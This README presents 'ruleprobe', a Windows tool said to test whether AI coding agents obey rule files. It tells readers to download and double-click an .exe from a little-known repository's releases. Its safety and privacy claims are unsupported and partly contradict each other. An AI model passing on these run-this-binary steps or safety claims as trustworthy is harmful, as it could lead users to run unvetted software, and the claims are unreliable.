# 🔍 ruleprobe - Verify AI agent instruction adherence easily

[![Download ruleprobe](https://img.shields.io/badge/Download-ruleprobe-blue.svg)](https://github.com/Zedekiahdiscovered948/ruleprobe)

This tool checks if AI coding agents follow your instructions. Many developers use files like .cursorrules to guide their AI. Sometimes, these agents ignore those files. This software verifies that the agent respects your setup. It performs a specific test on your project files to confirm the AI follows your rules.

## 📋 What This Tool Does

AI tools often make mistakes. They might skip a style rule or ignore formatting guidelines. You want your code to follow a specific structure. You write rules to ensure this happens. This tool acts as a tester. It checks if the AI keeps its promises. It looks at your code and your rule files. Then, it reports where the AI failed.

You benefit from this in three ways:
1. You save time on code reviews.
2. Your codebase stays consistent.
3. Your AI produces better results.

## 📋 Requirements for Windows

Your computer needs a few things to run this tool. Most modern Windows computers meet these needs. Ensure you have Windows 10 or 11 installed. You also need a stable internet connection. If you plan to check large projects, ensure your computer has at least 8 GB of memory. 

## 📥 How to Download and Install

Follow these steps to set up the software.

1. Visit this page to download the software: [https://github.com/Zedekiahdiscovered948/ruleprobe](https://github.com/Zedekiahdiscovered948/ruleprobe)
2. Locate the link marked "Releases" on the right side of the page.
3. Select the latest version for Windows. It will end in .exe.
4. Save this file to your desktop.
5. Double-click the file to start the installation.
6. Follow the prompts on the screen.
7. Click Finish.

The tool now sits in your applications folder. You can open it from the Start menu.

## ⚙️ Running Your First Verification

Start the program after the installation finishes. You will see a clean window. This is the main interface.

First, select your project folder. Click the "Browse" button. Choose the folder where your project lives. The program needs to see your code and your rules.

Next, select the AI agent you want to test. The list includes common tools like Claude or Cursor. If your agent is not on the list, choose "Custom."

Click the "Start Scan" button. The program will read your rules. Then, it will create a small test task for the AI. It observes how the AI handles the test task. You will see a progress bar move across the screen. This phase takes about thirty seconds on most machines.

## 📊 Reading Your Results

Once the scan ends, the tool displays a report. This report is simple. You see a list of your rules. Beside each rule, you see a checkmark or an "X."

A green checkmark means the AI followed the rule. A red "X" means the AI ignored that rule. Click on the red "X" to see an explanation. The tool tells you exactly what the AI did wrong. If the AI missed a formatting style, the report points to the specific lines in your code. 

You can save this report as a PDF file. Use the "Save Report" button in the corner of the window. This helps you keep a record of your AI performance over time. 

## 🛠️ Customizing Your Tests

You can tell the tool to check specific things. Use the settings menu to add custom criteria. Maybe you want to enforce a specific coding style. Maybe you want to block certain libraries. 

Open the Settings menu. Select "Criteria." Here, you can type in new instructions. For example, you can add "Always use arrow functions." The tool adds this to its test suite. Now, it will check if the AI uses arrow functions in your project.

This feature makes the tool powerful. You decide what matters for your codebase. You do not need to learn a new language to use this. Just type your rules in plain English.

## 🛡️ Privacy and Safety

This tool works on your computer. It does not send your code to a random cloud server. All analysis happens within your own system limits. 

We require access to your file system only to read your project files. The program cannot delete or move your files. It only looks at the text inside them. You can check the permissions in your Windows settings if you have concerns. 

## ❓ Frequently Asked Questions

### Does this tool change my code?
No. This tool only reads your files. It never edits or changes your project.

### How often should I run a scan?
Run a scan whenever you change your project rules. If you modify your .cursorrules file, run the tool again. This ensures the AI understands the changes.

### Does this need an internet connection?
Yes. The tool connects to the AI agent to run the test. It needs the internet to send the dummy task and get the response back.

### What if the scan fails to start?
Ensure you have the latest Windows updates. Sometimes, a simple restart fixes networking issues. Check that your folder path does not contain special characters.

### Can I test multiple agents at once?
The current version tests one agent at a time. This keeps your results clean and accurate. You can run new tests for different agents one after another.

## 💡 Tips for Better Results

- Keep your rules clear. If you use vague language, the AI may misinterpret your request.
- Start with small rules. Test one or two items at a time to see how the AI reacts.
- Update your rules if the AI consistently fails a specific test. Sometimes, the rule itself needs a rewrite.
- Use this tool after every major update to your coding guidelines.

This software provides a simple way to gain control over your AI agents. You remove the guesswork from your workflow. You move forward with confidence knowing your AI respects your instructions.